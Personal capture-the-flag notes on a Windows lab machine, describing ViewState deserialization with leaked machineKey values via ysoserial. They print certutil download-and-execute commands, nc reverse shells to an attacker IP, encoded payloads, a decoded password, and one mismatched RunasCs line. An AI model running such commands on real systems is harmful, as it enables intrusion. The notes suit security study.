# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: #seDebug

# Findings

## External
### Enumeration
`$enum$`

### Gaining Access


## Internal
### Enumeration
`$enum$`

### Gaining Access


### Maintaining Access


# Random Notes
![Uploading file...rk854]()
![[Pasted image 20240415135533.png]]
<!--⚠️Imgur upload failed, check dev console-->
![Uploading file...h76zb]()
![[Pasted image 20240415150243.png]]
![](https://i.imgur.com/nEqcV6c.png)
![](https://i.imgur.com/d208Qgv.png)
![](https://i.imgur.com/ws9iY5L.png)
- the exif result of the `cv.pdf`
Stephen Fitz
	![](https://i.imgur.com/cvRwXsw.png)
![](https://i.imgur.com/IpDupae.png)
```xml
<configuration>
  <system.web>
    <customErrors mode="On" defaultRedirect="default.aspx" />
    <httpRuntime targetFramework="4.5" />
    <machineKey decryption="AES" decryptionKey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" validation="SHA1" validationKey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" />
  </system.web>
    <system.webServer>
        <httpErrors>
            <remove statusCode="403" subStatusCode="-1" />
            <error statusCode="403" prefixLanguageFilePath="" path="http://dev.pov.htb:8080/portfolio" responseMode="Redirect" />
        </httpErrors>
        <httpRedirect enabled="true" destination="http://dev.pov.htb/portfolio" exactDestination="false" childOnly="true" />
    </system.webServer>
</configuration>
```
![](https://i.imgur.com/46mf6X5.png)

![](https://i.imgur.com/4kBl0g4.png)
- This code tells us adding the `../` is useless it will replace it with nothing.
![](https://i.imgur.com/7wvRxTE.png)
`Devcrud:`
`- Email : sfitz@pov.htb`
- Tried to Fuzz the `file=` parameter and nothing found.
	- ![](https://i.imgur.com/FHZJdPn.png)
	- Then i Tried to Test the `VIEWSTATE` parameter 
		- https://book.hacktricks.xyz/pentesting-web/deserialization/exploiting-__viewstate-parameter?source=post_page-----7516c938c688--------------------------------
- I got a command to run on [this] page and it was getting blocked by my antivirus
	- ![](https://i.imgur.com/gHz0oa3.png)
- So i paused the protection and executed the command.
```powershell
ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "certutil.exe -urlcache -split -f http://10.10.14.92:9999/nc.exe nc.exe" --path="/portfolio/default.aspx" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
```
![](https://i.imgur.com/XlmcQmp.png)


![](https://i.imgur.com/kIzcDiS.png)
![](https://i.imgur.com/k21zwXG.png)
- SO now i tried to do a powershell reverse shell payload
```powershell
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "certutil.exe -urlcache -split -f http://10.10.14.92:9999/winpeas.exe C:\Users\Public\win.exe" --path="/portfolio/default.aspx" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"

2kk9xeGQ5el2Ty1XlNxbGrKb1wL4lp6N1a1GGdLvbmdsl1G%2BFTKnM9O6DPIae65lKK%2BreJo1b4nYx3XX%2FVnxNlFVAabDmnBOf8N1jodhGvFLaX5jw%2FvoCbMpby45gejo%2FaWqB7TXAYSK%2BNadbqnEln944cm8Ftvj8XRzKcF5Dqh0fvz0POJlI2m%2BoTj5QyJbosIzYgHxL35bafp%2BOwnemTxl4IEROwcIaO4KwQqmueHd5uq%2F2r5JH8n6hS3VOAet6MIktZZlrCfBvMJvtIYhlpCZa%2FSOjaEqqJHPtrXZtWjC066FyXY7mTVm7%2BykeQrOMCqZ39WvRPq6Fas6%2FQ%2BPqzs21JD%2BMgug5%2F0rdc6beDmAaDdnhXMRQ4YEZpn%2FJSJ0%2B27dIOIVp5ejnpustvd1CEZAx53n9pRUvdxoIPS9F1R3YWrMakeb5Bsg6mpNL1WEibQi0zAUDqzcvEwzsR1Splzzta3PsWjnYT93sFTLS6qToph0NfzMWW0MbT625int3rfRMlFpnxjVZyhTcKDZMYA3gl6pucQ5C2sgS%2BG2vfIMIuw0ksoyw0J5SjevjYmKNSs85lyC4%2FxxiJ%2F%2FiHVaGflyIAY%2FCltzS9Gp5i1k3RK8V2kD3Dq4bXHsqJfLepoj%2FxIWNw0xz9l%2FfIezHpPbeBjxe8oOvbfB0EumZZvez6tzZRAvLnpRgngaYJI%2B0RQGUdFZ588OAZ%2BKHJh2rL0M2RQxzCDIHWiCTX9a2VSaNWvRxexBqefXrkpFqxFOtuTqdX6rHs6D78PHo65aZmIiwcrvSfYdbQOXiBFAm5JBxYPXO9cL7J6mxeMHu%2F9ES5OkcMa%2FdltObV1bwmahhAuPFwPP1AYwkXRyepf%2FlGVmHGlxo6H1P9R4zkjaeaX9LC4J3odqx29HSGQX5HgZ9W7UPPL4RzwRmUOXHxTT5yarEK6UAYaNvAmfqZ6rqypAt6WiMAu8MT%2BcACIXuh63Ame7AYo0J%2Fo50gV%2B%2Br0oOdqXWISXL7fg3biNHM3d8%2FvO7NZCmPOcwRanmDgnU9XNHI0Boll8ONeNdPUkuoy02g8JlBvg3mMBpK3HhnoYBXKR5eKN%2BQytqeJSrMaJzD3QX73ffQvjpeG1lbMz9T1U2BqEcnxXV1xqVlgDDXfaTtQcPj7%2BjqMy4PBtEKStgFe2U1yTAfS6dN6oiDeo6nYX0x1LpynpSCcQb%2BwkdbTNZW0rvvooQy1xDlt2MTsWSBULR5%2FcQcRsVJQB%2FDA55dkeow16tJqobp1fngvntslFxdyfRKKwJ%2FKWKWAx9cxz4tRSnAZptGaMe55%2FPurPwLnA%2BXBDxaoLOf%2F2RgKlMYoLW80DEL0onPO2polKdfA0TviIKQtB4NvMiKNaLGXEjab%2FODkWiYSYuczihLfc4ULATFb2EJMyRzjyFB6O8u4vlDLmx%2BXywAq%2Fa9c1EgS%2FFrygkNw0M7lNWmEXNYdeG39v48aquYDgUYTaRfECVGUXN%2BeUB%2FOtM%2BGRm1mZ8Yws0n3M66ofQg9GMKZMIj8IkA3FkGyBv8nuPiJMGiRg5cJ1zf0yPdY8VI0LrkDJKlfnfJLEoiGvjb54pptn3JzHh%2F4YeIim0uh6YLtfc9QjZbNM0AKi8XXmgwnhezDYx8%2FIEBnPGRr5vODCIMiEBnGghUxiF%2BYN6PYcLuyIr%2BbsNIpL%2B1fe6x5jMcd1w4vjS%2FqrvsD5chJr48ETlRkR7DaBKt2bmHdjWgbi0vY4Gm8P8JjDTqT04TnYlF%2Bk%2FXjH7J5xJIJ4%2Fiaqj6DlDdN%2BUI5Xy7%2FiFbFtftTvbj0tBAuTLMq5r2wW6zlYhRhe3nXzDieeUmZ2uQKrKjFBiY6uEuZxb2aOBRNXxEuunQAcxD%2BhODjOWIh1Rm0hQews45tZprMdjnLaU7AGiy7hGtNlfYabUoZ4BVc%2Bcc44OXKMabKFkRVe9Qf3r9JcP3VoScE61iasusAbiA65XAfZxbIfN4GCq9zIeGKbuESdxjcSfXBUll5Tu7gwS8I6R%2FElSyNmb5FFXJ9BQvtJ2WyKOKaFSRaUIN9XVIgMzEaqUtwEAY8K0mICsNltILNPJ%2B3ZnRJlgzJ5gYiVfg26Cr0OdJrH%2Fq6VbReI1NlTWwImS0AK%2BKzxilW%2BObbgBIo%2FkaNvHHJpFynwcijoWbQM5IfKQ1X3dcYeAlSqayptBCCxAXWuyJKTOwq15FOx5Mpmw0U4KW%2BbEUi%2BpNKPorjQ%2BOff%2BPBgA%2BClqaB13lk%2BSsXfZrAzBjL%2FdgwyYRmFY9d3LELcP5hgVev3V5Syh6I2qtrPMJnRmhTuvaIYkoPf%2Fwxc43W9KitH42MUhraXaPGKtjTnFMzCamijJ93pouY0zRsTajdDSg7oElVu5vdmpLgnYZx%2FuHJSeDzahDUCl9jf1JTm4vvbIrXvilQMMQlSGyCfxb4z8xH09siKWFboyiWnDoXJBXlFugqqWo3N6%2B%2B02XcYnt4WO8BxRPmED7XMu9idADCFgysHpm7Sa4JYw6SIp3eV9evyQWyp8DlJOdJpbfqvWscUCWCRRWTDXvcTVg3UufZr0hRbtCYLVvH2wTAF9NmDHClaSk1tbzsfY%2FqJaKm%2B4u4QkUkyBrSB67wHX3gAIX57E8QmSGY59skgACk4d975n%2BqurFFWuovBevWOeuDV1I2WX%2B1Tf3YJFvlMjExGKrQaC0ajYe5IecvF4mn4Xu19Q6kt4JadP4TGYmZR7zJRIOyAoDYOWRB8cP5tOOdcM2ebJs8Vj3ABsfuhz2%2Fc6URfrNncPD4a6JydXwUbPxHwOsQe8jz4KfvbjewuS7BVcxyxpyLl5hTM2BRmI2MLXkY8K1HYe9jXrlN1NCAYcEa4m8QPO8SIXHhEirYb5j%2BdfPNgTKM1iudRQo5rvJ3LBk%2Fdw1jAoYFjaujz1K%2BQ0BdDmWzreiUnE5173Lbd9V46qNGZtel6wVcPiChAz5TPCXARTy4CSSbR6FYRw0NJTyvFbBCjJjdbxLL%2B7x9p%2B%2BvS2wHvAfCZrGko6m2R4lRkvHFFLjq9lDfj73p6SpU0ytkrwIt2beGtyBEThlmIV4mveA5RwsGEfq%2B3hlQpQivh4H6NjMqVP46h1fmq2%2Fw5WPC1CDVh2K6lWUUgP9hZketyNcFSsixOhG62is0U%2BP6JbB951teGP2K5ioNStWHtDBQjdWY%3D



.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "C:\Users\Public\nc.exe 10.10.14.92 4444 -e cmd.exe" --path="/portfolio/default.aspx" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"


kgo%2F8d%2B1QzOCU5iZDzB2P2OwjyoHboxFLp28%2FXrPBn3Jv1ZA5BOyPyX86Ldpc35AW4VeKf5JHBkdt%2BSM5258YGQrRLxJONCXRWVjB9VNtsVM3o%2BbMigVhdxtmCWwvQUOQjd7T20q23k899%2F0e%2BrVkGO%2BruceJTEckRnOzjtumIfYmc5kX6gnsRiaCH1ufzBq%2Bv6cOC6D%2BAkVFdTyMo2w5YJCNt7ItccUcJpejRqHOP%2FRJZzz0H7unN7aL%2FvMJsYnHqB5JoxVh8ARYaBsKK6a3XVhIUCIdkzi84i856FoizJhlF61B6m7a7Ql3MMcpKl%2Fl%2F0ZszLfWG%2Fj84mYr3%2FH4sqc9VYYkbaWMMSdwOTmQIWkYYfa2n9gGD2Db409pcsvlyw5e4744XfkUbXaq1IJk3xK0UJgpg2v1Z0OZpDPWp%2F6Y%2BJjcJ2Cf%2BnpWxhw75zvycKTYbyILN%2Fr%2FpkrtuKDVTdqKd1lWwezMhUifQYX8mfA2exnHC7JNuwZbo37KIZIUAOYY5Xo0L3Xt%2BJs4KpDDrV%2B4dE16ol5J9r5w%2BhTnYh%2F1r59Uj9yJTUMhGSvnlMAA8uUa2PiJ5Us3RZSCvHQ6Tl%2FJ4IJs9KeBmK8gwox01EHJtXUUawr8bXi4Y2OtA1IuxjCvR%2FpJvycH8o9Pu3AcvRvSLsQIYiGb0QTmPw2%2BPBItonnZ4du5McelesEWACxZEpDkeZ2RB9w4yThGW7KyN3kjxzbMfu9KrKuj%2FzmKAjpkLSepKoO1vALw5e3AW6FRNZhk2BKNIKBo7fbg7FrYwkEzyEzrmC9tXolxl25CLwBQcVx5zUuz0UOsP2zquNKGoJVheWkVeOT4IIgwB2pNo%2B3YJVOPDyILnt95tZcWWdoDri23hrzm7TggiswRk2xRYb6wRIRZPnnegrbO4%2B%2Bn5uql4%2Fgw8J4IejyJSMhvNm4u0x%2BmorNVC2z1ql4hO5o27ha%2B7VUCd0sk5Zfc%2FJIsdE3OxyOcfrK%2BDu14NgUSl3noILpCsmGVuzUA7s%2Fi6DyTYRetEvFr63H6rLwYhaZaLGYa6vzD%2BhKwZ7G3MvTNwWHBR49yFIsZ9Btut39YZ90pUDMpltCIt%2BhsBSW5hW0ZUMOqMjVgUlJRs%2FKmH5heSn32Us6d3AE2%2FPNaQobNZizYCS%2BVo9i0RPeRx8B1ktpTplC5%2BoXr00Y0v3yp8WM1024GRccnmZRH4HpcVYxRAisTLoCZFe%2FTH6Oqzb3eFjI%2BgeXddFIVmZ%2FdnPPAhZheseQFAX0svda4KWCqt8FmM9HcNfolLLzUs6WXPKj0EVb7bon1sc%2FfM9%2BU9vgsdVHkvXGRsktWOjz38YrGEMRx8%2B5mFeTPOZXs%2FxW0VRPL9x34i1dUzQRpXdwz8c6Pej7rr81pwx4j3yPJljX5ON5GCOC6ooaPDdcz%2Ftr6tJ6h%2F1gZAUsnohC%2FVDhIzBDicpG8AGTrb2oWD1UTxKNtcecN9s3F83isq2PVTKo0nmN%2BL8bIDZbk48C8so9smcTFH2AOHXgZ1p4quDFd4TtmzlLKtnbM0nLf1Hzb%2BvbHO0nKevihEyN13UtUDmjKXCyXa7iBrBdg8XgoLM2DtGDwmDsd4iW6GuTnz2%2FTONUT3dP8j%2FPqJLOoJWVrKtrvT%2BnKC2ntLG1t%2FkTUMfO5weU%2BxXCzzbnKkpuulBxjLF0FTjZA6IqxVzNhDhGFWxPr5xeJcLjXUl%2BfyhXFuFS%2BlGjNz2lXm9%2FEW2%2Fh7pAvuyZBZfYViRh62r4w2A91d3n3n31HXC8%2BNEG0s15i6H0Wt5OexkOrzYQDDhynqoXEGcVh7x0P8lgRB5YRbW%2FE9%2F52gNiYVxQMZicv%2FuTpDjlEboc0idkj2zdWPh%2B4JVN%2FK%2BTH0Un9ddDuULEnvmLstUV%2BzMGXtR0e9sT1%2FTeFQqCbRPgkSUQhtXMJRiVauT3IspkVZV%2Bz4EYiboYd8QgE2tzG7YGw1C0CSkwRMZPTcJAymQiz7HMTVgLKlFA4iIXxaGdDBKI2T8KCOxTH3AUrGFyP3t2O5MI%2Bo4boNpXH%2BWvXqgi6U%2FXsDHqNlJd%2Bp17LglrbRSqoibca6ZxMtnPTEd4pPAG9EWea6wnl%2FpdDgjhUddayFhvE8mdKZLKD8BcWVQr%2FQ%2Ftsey7FqzSDlLWc37pYDJEKrKRtOzEGWZAWg7cNsRAav4AHqDk0sTBeHR7FtLuB8Kw0ZHALu9Us%2B61XgRgZB6q6kBzMWjt1%2FlYH6SQoXL%2Bfm5ACCUPZzm2s364idhK4%2FaKqxaRh6e7cmgCvDsE%2B3qMARPwUYUTKRHc%2FtGURZNPbZdd1MdZcKyP7a6bCRx6wN70ooDFN%2FyvrJK6FbwavWte88l1jUq%2BCBtl1NUkJ9Wj0KySVFBtIg6sSM46WwUcZNAQHklf2t9ukUjh9BizwkVqbwHQiRZFxN03BhFlnvSnF%2BGABU66eyo%2FkQXX8Hbm%2BUWzFOryOgVEnyTEZqyB4QAP3hnCahZj%2F0ti%2FO0ijdZEH8S2mKciKDIo8%2Fc72qZ3oUZba0nX8Buyat5pVgDvhBw2S5NMy32W0rWROIkiwlnuGDTKFf%2FQtR20WvE3j40nKU91Hzdmj%2FOBMrSlP1k2mIEC5r1hgGGNVsqL%2Bo3It%2Fc%2BIdBEl1mPLTdCLJZg1m5qqDPoJPan%2FmFNDvNyb9PxVJaQfFxHQUa1CDdxap%2B%2B6PVoYKWwtgdDUmjbpMoL0gdxuzv0NMcOwX4HyxTs4Uqp3dC%2FyidheWFaTrTMsUxXPxsWXNqKpRosYsOzKvdneceCMiHI5uzMYtAtF296g5d6%2BqoSlBJhZ%2BfpNItdRGskaG%2FLz4xiLW2pWpdcOm4lUc%2Ffd3Yzac0257UOvPQz3Oy1gK%2BU6JAPk5TZCspe01BZTxS5xzEjbarB4%2FI%2FQ0HpnnnBdsVwf7TaKzDt2%2FB8a4tMQkdYHmOhBfWIl4xTTeKhJ%2FtCiPfXpG6SMnvSdxxkwh%2BKyCax3jfF8soFMUEjvdAlKalNHyw6wguZ1dHR3P47%2BO83gQOL%2FoOME2RkQhMBS%2FK9KaanUZBa2bm6X38G6ktVZVHC0j%2BiDo2CrrdqVLms5ZvBcYPSSxqd9HXiOgbPQDcy1WgEzy7zGTWGC6MzGCttgCn%2BF2iy2TWVHdv7
```
- It was hard, beacuse WIndows Defender was deleting it everytime.
	- ![](https://i.imgur.com/OIBybdu.png)
- But we did it
	- ![](https://i.imgur.com/EW4ATT4.png)
- I did some enumerations on the user, and i got user `alaading` Powershell Credentials.
	- ![](https://i.imgur.com/MOZinvF.png)
	- ![](https://i.imgur.com/E0TkQWO.png)
	- It is Powershell encoded so, i tried to decode and got the password
		- ![](https://i.imgur.com/b7jupOu.png)
`alaading : f8gQ8fynP44ek1m3`

TO connect with the user i used tool called `RunasCs`
	![](https://i.imgur.com/rGw1hpY.png)
	Invoke-RunasCs -username svc_loanmanager -Password 'Moneymakestheworldgoround!' -Command "nc.exe 10.10.16.52 4433 -e powershell.exe"
![](https://i.imgur.com/bmGMqQv.png)
![](https://i.imgur.com/Y7I5RJv.png)
- We got user flag
	- ![](https://i.imgur.com/YEU4CHN.png)
- ![](https://i.imgur.com/db6auCL.png)
- `SeIncreaseworkingSetPrivilege` is Disabled lets enable it using `EnableALlTOkenPrivs.ps1`(https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1)
	- ![](https://i.imgur.com/HDUCQCz.png)

- I wanted to use metasploit on the debug privilage.
	- ![](https://i.imgur.com/YjKPWrD.png)
	- ![](https://i.imgur.com/zcruKPv.png)
	- ![](https://i.imgur.com/cVu2j4V.png)

- ![](https://i.imgur.com/qMFt9AH.png)
![](https://i.imgur.com/zZFHMsV.png)
- we Got root!